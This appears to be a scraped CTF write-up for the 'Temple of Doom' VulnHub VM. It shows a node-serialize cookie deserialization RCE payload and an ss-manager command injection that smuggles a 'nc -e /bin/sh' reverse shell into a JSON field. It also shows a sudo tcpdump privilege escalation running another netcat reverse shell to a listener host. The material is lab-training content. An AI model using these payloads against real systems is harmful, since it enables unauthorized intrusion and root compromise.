@@ -1,0 +1,453 @@
+
+								
+																		Hack the Temple of Doom (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 25, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Temple of Doom is a new CTF challenge VM on vulnhub made by 0katz. You can download it from here. The aim of this lab is to capture the flag in the root directory of the system. This lab is inspired by the Indiana Jones movie Temple of Doom. The level of this lab is intermediate.
+Steps Involved
+
+Port scanning
+Burp intercept to capture cookies.
+Cookie processing for node serialize RCE vulnerability.
+Getting the current user by RCE.
+Getting a netcat shell for the current user.
+Discovering ss-manager being run as root.
+Exploiting command execution vulnerability on ss-manager to get a netcat shell
+Shell crafting from tcpdump and sudo
+Getting a netcat shell as root.
+Grabbing the flag.
+
+Let’s get started 
+First and foremost, we scanned the IP address with the most popular scanning tool called nmap. It discovered all the ports open on the victim’s system.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.130
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.130
+					
+				
+			
+		
+
+
+Hence, we observed that port 666 is hosting a node.js express framework so there must definitely be a web page at port 666. We tried to open the URL on the browser and obtained the following result.
+
+We also opened the source code behind the page but nothing seemed to impress us. So, it was time to capture the page’s request using Burp Suite. Burp Suite acted as a proxy and revealed the activity going behind the front end.
+
+We got a cookie which was double encoded. It was a Base64 + URL encoding (because we observed “%3D” at the end of the cookie which is nothing but a URL encoding).
+So, we sent this request to the repeater and then decoded the cookie using these keyboard shortcuts:
+CTRL+SHIFT+U (to decode URL)
+CTRL+SHIFT+B (to decode base64)
+
+We observed the username and some token details in the cookie. But there was an add-on in the information when we refreshed the page again, it gave us an error like:
+
+So, it gave us a hint to look over at the cookie we just decoded. We observed that there was a missing quotation mark before Friday. Hence, we fixed the quotation mark first.
+
+Then we encoded the cookie again to replicate the format of the cookie that we got before with the keyboard shortcuts:
+CTRL+B (To encode in base64)
+CTRL+U (to encode in URL)
+And then we forwarded it to observe the following output:
+
+We inferred from the response of repeater that the page will output the username provided in the cookie.
+We looked at the cookie again, it was of the format:
+{“username”: “&lt;uname&gt;”, “csrftoken……..”}
+We removed the rest of the token details first to check for any errors.
+
+We then encoded it and sent a request to the server and checked its response in the repeater.
+
+It seemed to be working even without Token details. Then we edited the username with a custom input. Example:  {“username”:“Harshit” }
+
+Repeating the process of encoding it and sending it to the repeater yielded the following result to us.
+
+Hence, we finally established that node-serialize was used. (You can read more about node-serialize here ).
+What serialize does is that it determines, which data of the user object should be stored in the session. The user id (you provide as the second argument of the function) is saved in the session and is later used to retrieve the whole object via the unserialize function.
+Which turned out to be vulnerable! Refer to this article to read about how node-serialize is vulnerable to Remote Code Execution!
+Hence, we used the shell provided to us by Ajin Abraham (on his blog) we modified the username argument with the shell.
+ 
+The shell:
+
+		
+		
+			
+			
+			
+			
+{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=&gt;{console.log(out);}); }()"}
+			
+				
+					
+				
+					1
+				
+						{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=&gt;{console.log(out);}); }()"}
+					
+				
+			
+		
+
+Explanation of the shell:
+_$$ND_FUNC$$_function() : Executes a function locally.
+child_process is a module in node.js that spawns child processes in a manner similar to popen(3).
+child_process.exec () method: This method runs a command in a console and buffers the output.
+It specifies string Shell to execute the command with ( Default: ‘/bin/sh’ on UNIX)
+So, the shell we made told us the current user on the Linux system. We encoded it and forwarded it.
+
+Hence, the current user was nodeadmin.
+ 
+We then executed the command ls -lart
+Encoded it and forwarded it and the following output was observed:
+
+After establishing this much information, we ran a reverse netcat shell command.
+
+Then we encoded it again and forwarded the request. Side by side, we activated a listener on kali and BOOM! We got a connection
+
+		
+		
+			
+			
+			
+			
+id
+			
+				
+					
+				
+					1
+				
+						id
+					
+				
+			
+		
+
+It showed us the current user was nodeadmin.
+We then tried to spawn a TTY shell using python utility in the victim’s machine.
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Which gave us a teletype!
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+cd fireman
+			
+				
+					
+				
+					123
+				
+						cd /homelscd fireman
+					
+				
+			
+		
+
+Permission Denied!
+
+We also observed that nodeadmin doesn’t have proper access to the folder fireman. Since nodeadmin is not the root, fireman directly or indirectly could give us the root.
+Let us see if any process is run by a fireman as root or not
+
+		
+		
+			
+			
+			
+			
+ps aux | grep fireman
+			
+				
+					
+				
+					1
+				
+						ps aux | grep fireman
+					
+				
+			
+		
+
+We observed that ss-manager is run by a fireman as root. After googling a little, we found that ss-manager was vulnerable to remote code execution (refer here).
+ss-manager is short for Shadowsocks.
+Shadowsocks-libev is a lightweight secured SOCKS5 proxy for embedded devices
+and low-end boxes. The ss-manager is meant to control shadowsocks servers
+for multiple users, it spawns new servers if needed.
+Hence, we’ll use Shadowsocks with netcat command execution by:
+
+		
+		
+			
+			
+			
+			
+nc -u 127.0.0.1 8839
+add: {“server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.1.106 4444 ||"}
+			
+				
+					
+				
+					12
+				
+						nc -u 127.0.0.1 8839add: {“server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.1.106 4444 ||"}
+					
+				
+			
+		
+
+
+Side by side, we activated a netcat listener and obtained a shell.
+Then, we spawned a teletype(TTY) using python again and then we checked for the sudoers list using:
+
+		
+		
+			
+			
+			
+			
+id
+python -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l
+			
+				
+					
+				
+					123
+				
+						idpython -c 'import pty;pty.spawn("/bin/bash")'sudo -l
+					
+				
+			
+		
+
+ 
+We observed that tcpdump is present which could also be used for remote code execution!
+To execute a shell, we moved to the directory /tmp since any user can read, write or execute files in this directory.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+echo "nc -e /bin/bash 192.168.1.106 8888" &gt; shell
+chmod 777 shell
+sudo tcpdump -ln -I eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
+			
+				
+					
+				
+					1234
+				
+						cd /tmpecho "nc -e /bin/bash 192.168.1.106 8888" &gt; shellchmod 777 shellsudo tcpdump -ln -I eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
+					
+				
+			
+		
+
+The above commands changed the directory to tmp, created a file called shell with a reverse netcat shell, changed the permission of the file of that file to RWX and finally used sudo and tcp dump for remote code execution!
+
+
+Side by side we setup a netcat listener:
+
+		
+		
+			
+			
+			
+			
+nc -lvp 8888
+			
+				
+					
+				
+					1
+				
+						nc -lvp 8888
+					
+				
+			
+		
+
+Again, we spawned a teletype using python:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+BOOM! We have the root access!
+
+In the end, we found the flag in the root directory!
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat flag.txt
+					
+				
+			
+		
+
+CONGRATS! You too are a soldier now!
+
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								sarthak misraa November 14, 2018 at 10:23 am							
+							
+							
+														
+							
+								sudo -l prompts for password, which we dont have either of nodeadmin or fireman, then how are you able to run that command ?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
